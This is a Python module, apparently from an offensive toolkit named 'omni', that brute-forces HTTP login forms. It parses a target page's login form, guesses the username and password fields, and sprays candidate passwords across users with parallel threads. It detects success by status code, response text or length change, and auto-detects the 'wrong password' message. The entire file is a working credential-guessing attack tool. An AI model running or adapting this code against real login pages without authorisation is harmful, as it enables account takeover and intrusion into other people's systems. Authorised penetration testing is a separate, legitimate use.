"""HTTP form brute force — stdlib only, threaded, success-rule driven.

Success is decided by a predicate on the response (status, body substring or
body-length delta) rather than by a hardcoded CMS check, so it works against
any login form the operator points it at.
"""

from __future__ import annotations

import queue
import re
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

from omni.core import config

__all__ = ["Form", "parse_form", "discover_form", "Attempt", "run",
           "guess_fields"]


class Form:
    def __init__(self, action: str, method: str = "POST",
                 fields: dict[str, str] | None = None):
        self.action = action
        self.method = method.upper()
        self.fields = dict(fields or {})


_INPUT_RE = re.compile(r"<input\b[^>]*>", re.IGNORECASE)
_ATTR_RE = re.compile(r'(\w+)\s*=\s*"([^"]*)"', re.IGNORECASE)
_FORM_RE = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.IGNORECASE | re.DOTALL)


def _attrs(tag: str) -> dict[str, str]:
    return {k.lower(): v for k, v in _ATTR_RE.findall(tag)}


def parse_form(html: str, base_url: str) -> Form | None:
    """First form containing a password field, as a :class:`Form`."""
    for m in _FORM_RE.finditer(html):
        form_attrs = _attrs(m.group(1))
        fields: dict[str, str] = {}
        user_field = None
        for tag in _INPUT_RE.findall(m.group(2)):
            attrs = _attrs(tag)
            name = attrs.get("name")
            if not name:
                continue
            itype = attrs.get("type", "text").lower()
            if itype == "password":
                user_field = user_field or "password"
                fields[name] = ""
            elif itype in ("submit", "button", "image", "reset"):
                continue
            elif itype in ("hidden", "text", "email"):
                fields[name] = attrs.get("value", "")
        if user_field is None:
            continue
        action = urllib.parse.urljoin(base_url, form_attrs.get("action") or "")
        return Form(action, form_attrs.get("method", "post"), fields)
    return None


def discover_form(url: str, timeout: int = 20) -> Form | None:
    """Fetch ``url`` and parse its login form."""
    body = fetch(url, timeout=timeout)
    return parse_form(body, url) if body else None


def fetch(url: str, timeout: int = 20, data: bytes | None = None,
          headers: dict | None = None) -> str:
    hdrs = {"User-Agent": str(config.get_value("brute.user_agent", "omni"))}
    hdrs.update(headers or {})
    req = urllib.request.Request(url, data=data, headers=hdrs)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8", errors="replace")


class Attempt:
    def __init__(self, user: str, password: str):
        self.user = user
        self.password = password
        self.status = 0
        self.length = 0
        self.body = ""
        self.error = ""

    def __repr__(self) -> str:
        return f"<Attempt {self.user}:{self.password} {self.status} {self.length}>"


def _submit(form: Form, user_field: str, user: str, pass_field: str,
            password: str, timeout: int) -> Attempt:
    payload = dict(form.fields)
    payload[user_field] = user
    payload[pass_field] = password
    encoded = urllib.parse.urlencode(payload).encode()
    attempt = Attempt(user, password)
    try:
        if form.method == "GET":
            sep = "&" if "?" in form.action else "?"
            body = fetch(form.action + sep + encoded.decode(), timeout=timeout)
            attempt.status = 200
        else:
            body = fetch(form.action, timeout=timeout, data=encoded)
            attempt.status = 200
        attempt.body = body
        attempt.length = len(body)
    except urllib.error.HTTPError as exc:
        attempt.status = exc.code
        attempt.body = exc.read().decode("utf-8", errors="replace")
        attempt.length = len(attempt.body)
    except Exception as exc:  # noqa: BLE001 - network noise
        attempt.error = str(exc)
    return attempt


_USER_HINTS = ("user", "username", "login", "email", "usr", "account", "name")
_PASS_HINTS = ("pass", "password", "passwd", "pwd", "secret", "passphrase")


def guess_fields(form: Form) -> tuple[str, str]:
    """(user_field, pass_field) from the form's own input names."""
    names = [n for n in form.fields]
    lowered = {n: n.lower() for n in names}
    user = next((n for n in names
                 if any(h in lowered[n] for h in _USER_HINTS)
                 and not any(h in lowered[n] for h in _PASS_HINTS)), "")
    password = next((n for n in names
                     if any(h in lowered[n] for h in _PASS_HINTS)), "")
    if not user:
        user = next((n for n in names if n != password), "")
    if not password and names:
        password = names[-1]
    return user, password


def _success(attempt: Attempt, rule: str, baseline: int,
             fail_body: str) -> bool:
    """Evaluate the success rule against one attempt."""
    if attempt.error:
        return False
    mode, _, arg = rule.partition(":")
    if mode == "status":
        return attempt.status == int(arg)
    if mode == "contains":
        return arg.lower() in attempt.body.lower()
    if mode == "delta":
        return abs(attempt.length - baseline) >= int(arg)
    # "auto": no failure marker and a meaningful length change
    if fail_body and fail_body.lower() in attempt.body.lower():
        return False
    return baseline and abs(attempt.length - baseline) > max(20, baseline // 10)


def run(form: Form, candidates, user_field: str = "username",
        pass_field: str = "password", users: list[str] | None = None,
        rule: str = "auto", threads: int | None = None,
        delay_ms: int | None = None, timeout: int = 20,
        stop_on_first: bool = True, progress=None) -> list[Attempt]:
    """Spray ``candidates`` at ``form`` and return every successful attempt."""
    users = users or [""]
    workers = int(threads if threads is not None else
                  config.get_value("brute.threads", 8))
    delay = float(delay_ms if delay_ms is not None else
                  config.get_value("brute.delay_ms", 0)) / 1000.0

    baseline_attempt = _submit(form, user_field, users[0], pass_field,
                               "omni-definitely-wrong-password", timeout)
    baseline = baseline_attempt.length
    fail_marker = ""
    if rule == "auto" and baseline_attempt.body:
        fail_marker = _guess_marker(baseline_attempt.body)

    work: queue.Queue = queue.Queue()
    for password in candidates:
        for user in users:
            work.put((user, password))

    hits: list[Attempt] = []
    done = 0
    lock = threading.Lock()
    stop = threading.Event()

    def worker() -> None:
        nonlocal done
        while not stop.is_set():
            try:
                user, password = work.get_nowait()
            except queue.Empty:
                return
            attempt = _submit(form, user_field, user, pass_field, password,
                              timeout)
            with lock:
                done += 1
                if _success(attempt, rule, baseline, fail_marker):
                    hits.append(attempt)
                    if progress is not None:
                        progress(attempt)
                    if stop_on_first:
                        stop.set()
            if delay:
                time.sleep(delay)
            work.task_done()

    pool = [threading.Thread(target=worker, daemon=True)
            for _ in range(max(1, min(workers, work.qsize() or 1)))]
    for thread in pool:
        thread.start()
    for thread in pool:
        thread.join()
    return hits


def _guess_marker(html: str) -> str:
    """Pick the most likely 'wrong password' sentence from a failure page."""
    for match in re.finditer(r">([^<>]{6,90})<", html):
        text = match.group(1).strip()
        low = text.lower()
        if any(k in low for k in ("invalid", "incorrect", "wrong", "failed",
                                  "denied", "try again")):
            return text[:80]
    return ""

